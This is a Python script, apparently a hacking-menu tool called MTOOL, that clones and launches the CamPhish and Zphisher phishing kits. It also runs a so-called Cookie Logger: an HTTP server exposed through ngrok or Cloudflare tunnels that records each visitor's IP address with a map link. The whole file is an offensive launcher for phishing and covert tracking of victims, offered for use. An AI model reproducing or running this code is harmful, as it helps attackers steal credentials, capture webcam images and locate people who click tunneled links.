import os
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
import curses

# Define tool functions
def download_camphish():
    repo_url = "https://github.com/techchipnet/CamPhish.git"
    directory = "CamPhish"
    try:
        if not os.path.exists(directory):
            print("[*] Cloning CamPhish from", repo_url, "...")
            subprocess.run(["git", "clone", repo_url], check=True)
            print("[*] CamPhish downloaded successfully.")
        print("[*] Starting CamPhish...")
        subprocess.run(["bash", f"{directory}/camphish.sh"], check=True)
    except Exception as e:
        print("[!] Error handling CamPhish:", e)

def download_zphisher():
    repo_url = "https://github.com/htr-tech/zphisher.git"
    directory = "zphisher"
    try:
        if not os.path.exists(directory):
            print("[*] Cloning Zphisher from", repo_url, "...")
            subprocess.run(["git", "clone", repo_url], check=True)
            print("[*] Zphisher downloaded successfully.")
        print("[*] Starting Zphisher...")
        subprocess.run(["bash", f"{directory}/zphisher.sh"], check=True)
    except Exception as e:
        print("[!] Error handling Zphisher:", e)

def start_cookie_logger():
    print("[*] Starting Cookie Logger...")
    file_name = input("Enter the name of the file to log data (e.g., logs.txt): ").strip()
    if not file_name:
        print("[!] No file name provided. Exiting Cookie Logger.")
        return

    print("Choose your tunneling service:")
    print("1. Ngrok")
    print("2. Cloudflare")
    tunnel_choice = input("Enter your choice (1-2): ").strip()

    tunnel_command = None
    if tunnel_choice == "1":
        tunnel_command = ["ngrok", "http", "8080"]
    elif tunnel_choice == "2":
        tunnel_command = ["cloudflared", "tunnel", "--url", "http://localhost:8080"]
    else:
        print("[!] Invalid choice. Exiting Cookie Logger.")
        return

    try:
        with open(file_name, "w") as f:
            f.write("IP Address, Location (Google Maps URL)\n")

        class LoggingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                client_ip = self.client_address[0]
                location_url = f"https://www.google.com/maps?q={client_ip}"
                log_entry = f"{client_ip}, {location_url}\n"
                print("[+] Logged:", log_entry.strip())

                with open(file_name, "a") as log_file:
                    log_file.write(log_entry)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Logging complete. Check the file for details.")

        print("[*] Starting tunneling service...")
        subprocess.Popen(tunnel_command)

        server = HTTPServer(("0.0.0.0", 8080), LoggingHandler)
        print("[*] Server started. Access the logger via http://localhost:8080")
        print("[*] Logs will be saved to:", file_name)
        server.serve_forever()

    except Exception as e:
        print("[!] Error starting Cookie Logger:", e)

# Main menu function
def main_menu(stdscr):
    curses.curs_set(0)  # Hide the cursor

    menu_options = ["CamPhish", "Zphisher", "Cookie Logger"]
    selected_index = 0

    while True:
        stdscr.clear()
        stdscr.addstr("=" * 50 + "\n")
        stdscr.addstr(" WELCOME TO MTOOL BY iamge01\n")
        stdscr.addstr("=" * 50 + "\n")

        for i, option in enumerate(menu_options):
            if i == selected_index:
                stdscr.addstr(f"> {option} <\n", curses.A_REVERSE)
            else:
                stdscr.addstr(f"  {option}\n")

        key = stdscr.getch()

        if key == curses.KEY_UP and selected_index > 0:
            selected_index -= 1
        elif key == curses.KEY_DOWN and selected_index < len(menu_options) - 1:
            selected_index += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            if selected_index == 0:
                download_camphish()
            elif selected_index == 1:
                download_zphisher()
            elif selected_index == 2:
                start_cookie_logger()
            break  # Exit menu loop after selection

        stdscr.refresh()

if __name__ == "__main__":
    curses.wrapper(main_menu)
